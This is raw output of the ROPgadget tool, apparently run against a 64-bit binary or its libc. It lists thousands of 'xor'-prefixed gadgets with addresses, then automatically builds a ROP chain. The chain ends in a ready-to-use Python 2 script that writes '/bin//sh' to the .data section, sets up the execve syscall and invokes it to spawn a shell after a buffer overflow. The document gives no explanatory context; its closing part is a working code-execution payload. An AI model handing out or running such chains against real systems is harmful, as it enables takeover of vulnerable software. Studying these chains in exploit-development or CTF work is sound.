0x00002aaaaab62b8c : xor eax, dword ptr [rax] ; add rsp, 0x100 ; ret
0x00002aaaaab5caf4 : xor eax, dword ptr [rax] ; add rsp, 0x18 ; ret
0x00002aaaaab61c2a : xor eax, dword ptr [rax] ; add rsp, 8 ; ret
0x00002aaaaab5a951 : xor eax, dword ptr [rax] ; jne 0x85967 ; jmp 0x85981
0x00002aaaaab58563 : xor eax, dword ptr [rax] ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab5d66d : xor eax, dword ptr [rax] ; mov qword ptr [rsp + 8], rax ; call qword ptr [rdx]
0x00002aaaaab5d9dd : xor eax, dword ptr [rax] ; mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaab599b3 : xor eax, dword ptr [rax] ; mov rax, qword ptr [rax] ; test rax, rax ; je 0x849c9 ; call rax
0x00002aaaaab5d265 : xor eax, dword ptr [rax] ; sub rsp, 0x80 ; call 0x11449b
0x00002aaaaab61c7d : xor eax, dword ptr [rax] ; test eax, eax ; jne 0x8cc9a ; add rsp, 8 ; ret
0x00002aaaaab59c64 : xor eax, dword ptr [rax] ; test eax, eax ; js 0x84c77 ; ret
0x00002aaaaac832fd : xor eax, dword ptr [rcx] ; add byte ptr [rax - 0x17], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab0fdab : xor eax, eax ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9bd00 : xor eax, eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab0ad88 : xor eax, eax ; add rsp, 0x140 ; pop rbx ; ret
0x00002aaaaac07c1c : xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f730 : xor eax, eax ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab93bd2 : xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaabf6625 : xor eax, eax ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaabf2ef8 : xor eax, eax ; add rsp, 0x28 ; ret
0x00002aaaaac0b4e5 : xor eax, eax ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaac18218 : xor eax, eax ; add rsp, 0x38 ; ret
0x00002aaaaac17a7f : xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaab0a8d0 : xor eax, eax ; add rsp, 0x88 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd10fd : xor eax, eax ; add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0f08c : xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab8fc5e : xor eax, eax ; add rsp, 8 ; ret
0x00002aaaaab02f30 : xor eax, eax ; and edi, 0xffffff80 ; sete al ; ret
0x00002aaaaac0f8a1 : xor eax, eax ; call r8
0x00002aaaaab4a297 : xor eax, eax ; call rbx
0x00002aaaaac0f8eb : xor eax, eax ; call rcx
0x00002aaaaac10700 : xor eax, eax ; call rdx
0x00002aaaaab0f6c6 : xor eax, eax ; cmp byte ptr [rdi], 0 ; jne 0x3a6d8 ; pop rbx ; ret
0x00002aaaaabab71c : xor eax, eax ; cmp cl, byte ptr [rsi] ; je 0xd66bd ; pop rbx ; ret
0x00002aaaaabdeaeb : xor eax, eax ; cmp edi, 9 ; setbe al ; ret
0x00002aaaaaba5af4 : xor eax, eax ; cmp edx, 1 ; sete al ; ret
0x00002aaaaab48057 : xor eax, eax ; cmp esi, 0xff ; setne al ; neg eax ; ret
0x00002aaaaab4c3e1 : xor eax, eax ; cmp qword ptr [rdi + 0x18], 0 ; setne al ; ret
0x00002aaaaabd68fa : xor eax, eax ; cmp qword ptr [rsi], 0 ; je 0x101911 ; pop rbx ; ret
0x00002aaaaabd123e : xor eax, eax ; cmp rdi, rdx ; ja 0xfc278 ; ret
0x00002aaaaac101bc : xor eax, eax ; cmp rdx, rcx ; je 0x13b1d8 ; ret
0x00002aaaaabe8eb7 : xor eax, eax ; cmp rdx, rdi ; setae al ; ret
0x00002aaaaabd69a7 : xor eax, eax ; jmp 0x10190c
0x00002aaaaac1699e : xor eax, eax ; jmp 0x14168e
0x00002aaaaab06d3c : xor eax, eax ; jmp 0x30ed8
0x00002aaaaab82422 : xor eax, eax ; jmp 0xad209
0x00002aaaaab82831 : xor eax, eax ; jmp 0xad669
0x00002aaaaac02550 : xor eax, eax ; jmp rcx
0x00002aaaaabe9f85 : xor eax, eax ; leave ; ret
0x00002aaaaabf14e6 : xor eax, eax ; mov byte ptr [rdx], 0 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabf8548 : xor eax, eax ; mov byte ptr [rsi + 3], r11b ; pop rbx ; ret
0x00002aaaaabca06f : xor eax, eax ; mov dword ptr [rbp + 4], edx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabf745d : xor eax, eax ; mov dword ptr [rdi + 0xc], edx ; mov qword ptr [rsi], rdi ; ret
0x00002aaaaabd0770 : xor eax, eax ; mov dword ptr [rdi + 8], esi ; ret
0x00002aaaaab0fc82 : xor eax, eax ; mov qword ptr [rdi + 8], rdx ; ret
0x00002aaaaab29d83 : xor eax, eax ; mov qword ptr [rdi], r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab73198 : xor eax, eax ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaabe9de1 : xor eax, eax ; mov rbp, rsp ; pop rbp ; ret
0x00002aaaaabfe72a : xor eax, eax ; mov rcx, r14 ; mov rdi, r13 ; call r12
0x00002aaaaac0eb98 : xor eax, eax ; mov rdi, rbp ; add rbx, r12 ; call r14
0x00002aaaaaba95b6 : xor eax, eax ; mov rdx, r8 ; jmp 0xd45db
0x00002aaaaac00435 : xor eax, eax ; mov rsi, qword ptr [rsp + 0x10] ; mov rdi, rbp ; call r14
0x00002aaaaac071d7 : xor eax, eax ; mov rsi, rdx ; add rdi, 0x10 ; jmp rcx
0x00002aaaaab10370 : xor eax, eax ; mov word ptr [rdi + 2], dx ; ret
0x00002aaaaabaf2c2 : xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab437e9 : xor eax, eax ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf4b75 : xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaaba1857 : xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaac00372 : xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac01b5f : xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaab4a050 : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf7b4f : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab8f9b8 : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaab0f26d : xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3fc54 : xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab08ee6 : xor eax, eax ; pop rbx ; ret
0x00002aaaaabf8236 : xor eax, eax ; rep stosq qword ptr [rdi], rax ; mov eax, r8d ; ret
0x00002aaaaaaf4b7b : xor eax, eax ; ret
0x00002aaaaab73c5e : xor eax, eax ; sub eax, ecx ; ret
0x00002aaaaabcb28d : xor eax, eax ; sub rsp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4c410 : xor eax, eax ; test byte ptr [rdi], 4 ; sete al ; ret
0x00002aaaaab4c420 : xor eax, eax ; test byte ptr [rdi], 8 ; sete al ; ret
0x00002aaaaab7f030 : xor eax, eax ; test ch, 0xf0 ; je 0xaa02d ; movzx eax, cl ; pop rbx ; ret
0x00002aaaaab7f058 : xor eax, eax ; test dh, 0xf0 ; je 0xaa02b ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab7f058 : xor eax, eax ; test dh, 0xf0 ; je 0xaa02d ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab0b268 : xor eax, eax ; test edx, edx ; sete al ; ret
0x00002aaaaab4f390 : xor eax, eax ; test rdx, rdx ; jne 0x7a3a7 ; ret
0x00002aaaaab814c2 : xor eax, eax ; xor ecx, ecx ; xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab4d1ca : xor eax, eax ; xor edx, edx ; div rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0ffbe : xor eax, ecx ; ret
0x00002aaaaab08bcd : xor eax, edx ; movzx edx, byte ptr [rdi] ; test dl, dl ; jne 0x33bb9 ; ret
0x00002aaaaab0f637 : xor eax, edx ; sub eax, edx ; ret
0x00002aaaaab0f64b : xor eax, edx ; sub rax, rdx ; ret
0x00002aaaaac08239 : xor eax, esi ; out dx, al ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac5e3f9 : xor ebp, 0xf581a0ff ; inc eax ; mov dr0, ebp ; call rsi
0x00002aaaaac5e3fd : xor ebp, 0xf58ec0ff ; call rsi
0x00002aaaaac42859 : xor ebp, dword ptr [rbx + 2] ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaac74b11 : xor ebp, ebx ; jmp qword ptr [rsi]
0x00002aaaaac5cb95 : xor ebx, 0xf37c6dff ; jmp rdx
0x00002aaaaac5cb7d : xor ebx, 0xffffffff ; mov sil, bl ; jmp rdx
0x00002aaaaab91073 : xor ebx, dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabc40da : xor ebx, dword ptr [rbx - 0x48] ; add eax, 0x5d000000 ; pop r12 ; ret
0x00002aaaaab5c96a : xor ebx, ebx ; add rsp, 0x10 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaaaff8db : xor ebx, ebx ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab9c8ed : xor ecx, dword ptr [rax + 0x39] ; ret 0xdd72
0x00002aaaaab8e452 : xor ecx, dword ptr [rax - 0x75] ; and al, 8 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaabd723d : xor ecx, dword ptr [rax - 0x75] ; jl 0x102271 ; adc byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00002aaaaaafa041 : xor ecx, dword ptr [rax - 0x77] ; ret
0x00002aaaaabc7699 : xor ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab6b2f5 : xor ecx, dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaab5d6bc : xor ecx, dword ptr [rcx + rcx*4 + 0x4b] ; call rcx
0x00002aaaaab014b2 : xor ecx, eax ; ret 0x4809
0x00002aaaaaafea73 : xor ecx, ecx ; call r15
0x00002aaaaab09a70 : xor ecx, ecx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaaaf68df : xor ecx, ecx ; not eax ; xor edx, edx ; add eax, 2 ; push rax ; call rbx
0x00002aaaaab814c4 : xor ecx, ecx ; xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaabfd4a4 : xor edi, dword ptr [0x30] ; call rax
0x00002aaaaac692c5 : xor edi, ebx ; inc dword ptr [rax + 0x35] ; sti ; call qword ptr [rax]
0x00002aaaaab528d9 : xor edi, edi ; call qword ptr [r15]
0x00002aaaaab56035 : xor edi, edi ; call qword ptr [rax]
0x00002aaaaab9b9e5 : xor edi, edi ; call rax
0x00002aaaaab528aa : xor edi, edi ; mov r13, rdx ; call qword ptr [r15]
0x00002aaaaac699c9 : xor edi, esp ; call qword ptr [rax + 0x20fffc35]
0x00002aaaaac69a29 : xor edi, esp ; call qword ptr [rax]
0x00002aaaaac69a09 : xor edi, esp ; inc dword ptr [rax + 0x35] ; cld ; call rax
0x00002aaaaab0efc7 : xor edx, dword ptr [0x30] ; call rdx
0x00002aaaaaad6b10 : xor edx, dword ptr [rdx - 0x7b] ; mov bl, 0xee ; enter 0x59e7, 0x5b ; ret 0x2a63
0x00002aaaaaaf68e3 : xor edx, edx ; add eax, 2 ; push rax ; call rbx
0x00002aaaaabc9f6f : xor edx, edx ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab94281 : xor edx, edx ; add rsp, 8 ; mov rax, rdx ; ret
0x00002aaaaaba9fb0 : xor edx, edx ; cmp dword ptr [rbx + 0xa4], 1 ; setg dl ; jmp 0xd4f4b
0x00002aaaaab254c3 : xor edx, edx ; div ecx ; add eax, r8d ; ret
0x00002aaaaab4d189 : xor edx, edx ; div rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebc2c : xor edx, edx ; div rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4d1cc : xor edx, edx ; div rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebd29 : xor edx, edx ; div rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab9c90e : xor edx, edx ; jmp 0xc78d8
0x00002aaaaab814c6 : xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaabd7f1b : xor edx, edx ; mov esi, 1 ; mov rdi, rbp ; call rbx
0x00002aaaaab7322d : xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab50a09 : xor edx, edx ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaab52b6c : xor edx, edx ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaabfee28 : xor edx, edx ; mov rsi, r12 ; mov rdi, rbp ; mov rcx, r13 ; call rbx
0x00002aaaaabc40f0 : xor edx, edx ; mov rsi, rbp ; mov rdi, rbx ; call 0x3b3ca
0x00002aaaaab61c03 : xor edx, edx ; or cl, cl ; cmove rax, rdx ; ret
0x00002aaaaab4328c : xor edx, edx ; pop rbx ; div rbp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabe0de7 : xor edx, edx ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44b6a : xor edx, edx ; pop rbx ; pop rbp ; pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaabcaef0 : xor edx, edx ; xor esi, esi ; lea rdi, qword ptr [rsp + 0xc] ; call rax
0x00002aaaaabd79f1 : xor edx, edx ; xor esi, esi ; mov rbx, rax ; call rax
0x00002aaaaac5ec29 : xor esi, 0xf67ce2ff ; jmp rax
0x00002aaaaac5be61 : xor esi, eax ; jmp qword ptr [rax - 0x1f000fcc]
0x00002aaaaabb942e : xor esi, esi ; call 0x8e696
0x00002aaaaab2239d : xor esi, esi ; call rax
0x00002aaaaabcaef2 : xor esi, esi ; lea rdi, qword ptr [rsp + 0xc] ; call rax
0x00002aaaaabd6c41 : xor esi, esi ; mov r12d, edx ; mov rbp, rax ; call rax
0x00002aaaaabd79f3 : xor esi, esi ; mov rbx, rax ; call rax
0x00002aaaaabd7a18 : xor esi, esi ; mov rdi, r12 ; call rbx
0x00002aaaaabd7a3d : xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabd7a61 : xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7a81 : xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaac08530 : xor esi, esi ; mov rdi, rsp ; call 0x1f7e7
0x00002aaaaabbd02e : xor esi, esi ; ret
0x00002aaaaac699c5 : xor esp, edi ; call qword ptr [rax - 0x6f0003cd]
0x00002aaaaac69a25 : xor esp, edi ; call qword ptr [rax]
0x00002aaaaac69a05 : xor esp, edi ; inc dword ptr [rax + 0x33] ; cld ; inc dword ptr [rax + 0x35] ; cld ; call rax
0x00002aaaaab3ab89 : xor esp, esp ; jmp 0x63704
0x00002aaaaab3ab88 : xor r12d, r12d ; jmp 0x63705
0x00002aaaaab4a296 : xor r8d, r8d ; call rbx
0x00002aaaaabfe729 : xor r8d, r8d ; mov rcx, r14 ; mov rdi, r13 ; call r12
0x00002aaaaabe4e90 : xor r9b, bpl ; ret
0x00002aaaaaafea72 : xor r9d, r9d ; call r15
0x00002aaaaabd05e2 : xor rax, 0x20 ; mov qword ptr [rsi + 0x48], rax ; ret
0x00002aaaaaaf584a : xor rax, qword ptr [0x30] ; call rax
0x00002aaaaab0a31f : xor rax, qword ptr [0x30] ; jmp rax
0x00002aaaaab046d0 : xor rax, qword ptr [0x30] ; mov rdi, r13 ; call rax
0x00002aaaaab22395 : xor rax, qword ptr [0x30] ; xor esi, esi ; call rax
0x00002aaaaaaf5849 : xor rax, qword ptr fs:[0x30] ; call rax
0x00002aaaaab0a31e : xor rax, qword ptr fs:[0x30] ; jmp rax
0x00002aaaaab22394 : xor rax, qword ptr fs:[0x30] ; xor esi, esi ; call rax
0x00002aaaaab5fd15 : xor rax, rax ; ret
0x00002aaaaab08bcc : xor rax, rdx ; movzx edx, byte ptr [rdi] ; test dl, dl ; jne 0x33bba ; ret
0x00002aaaaab0f64a : xor rax, rdx ; sub rax, rdx ; ret
0x00002aaaaabfd4a3 : xor rdi, qword ptr [0x30] ; call rax
0x00002aaaaabfd4a2 : xor rdi, qword ptr fs:[0x30] ; call rax
0x00002aaaaab0efc6 : xor rdx, qword ptr [0x30] ; call rdx
0x00002aaaaab0efc5 : xor rdx, qword ptr fs:[0x30] ; call rdx
0x00002aaaaabcaeef : xor rdx, rdx ; xor esi, esi ; lea rdi, qword ptr [rsp + 0xc] ; call rax

Unique gadgets found: 27629

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x2aaaaabf7462 mov qword ptr [rsi], rdi ; ret
	[+] Gadget found: 0x2aaaaaaf52e8 pop rsi ; ret
	[+] Gadget found: 0x2aaaaaaf6102 pop rdi ; ret
	[-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x2aaaaabbbf1a mov qword ptr [rdx], rdi ; ret
	[+] Gadget found: 0x2aaaaaad6b92 pop rdx ; ret
	[+] Gadget found: 0x2aaaaaaf6102 pop rdi ; ret
	[-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x2aaaaab73174 mov qword ptr [rdx], rcx ; ret
	[+] Gadget found: 0x2aaaaaad6b92 pop rdx ; ret
	[+] Gadget found: 0x2aaaaabd13e2 pop rcx ; ret
	[-] Can't find the 'xor rcx, rcx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x2aaaaab0319c mov qword ptr [rdx], rax ; ret
	[+] Gadget found: 0x2aaaaaad6b92 pop rdx ; ret
	[+] Gadget found: 0x2aaaaab08544 pop rax ; ret
	[+] Gadget found: 0x2aaaaab5fd15 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x2aaaaab5fd15 xor rax, rax ; ret
	[+] Gadget found: 0x2aaaaab80390 add rax, 1 ; ret
	[+] Gadget found: 0x2aaaaab63c7b add eax, 1 ; ret
	[+] Gadget found: 0x2aaaaab40419 add al, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x2aaaaaaf6102 pop rdi ; ret
	[+] Gadget found: 0x2aaaaaaf52e8 pop rsi ; ret
	[+] Gadget found: 0x2aaaaaad6b92 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x2aaaaab907c5 syscall ; ret

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x00002aaaaaad6b92) # pop rdx ; ret
	p += pack('<Q', 0x00002aaaaae98080) # @ .data
	p += pack('<Q', 0x00002aaaaab08544) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x00002aaaaab0319c) # mov qword ptr [rdx], rax ; ret
	p += pack('<Q', 0x00002aaaaaad6b92) # pop rdx ; ret
	p += pack('<Q', 0x00002aaaaae98088) # @ .data + 8
	p += pack('<Q', 0x00002aaaaab5fd15) # xor rax, rax ; ret
	p += pack('<Q', 0x00002aaaaab0319c) # mov qword ptr [rdx], rax ; ret
	p += pack('<Q', 0x00002aaaaaaf6102) # pop rdi ; ret
	p += pack('<Q', 0x00002aaaaae98080) # @ .data
	p += pack('<Q', 0x00002aaaaaaf52e8) # pop rsi ; ret
	p += pack('<Q', 0x00002aaaaae98088) # @ .data + 8
	p += pack('<Q', 0x00002aaaaaad6b92) # pop rdx ; ret
	p += pack('<Q', 0x00002aaaaae98088) # @ .data + 8
	p += pack('<Q', 0x00002aaaaab5fd15) # xor rax, rax ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab80390) # add rax, 1 ; ret
	p += pack('<Q', 0x00002aaaaab907c5) # syscall ; ret
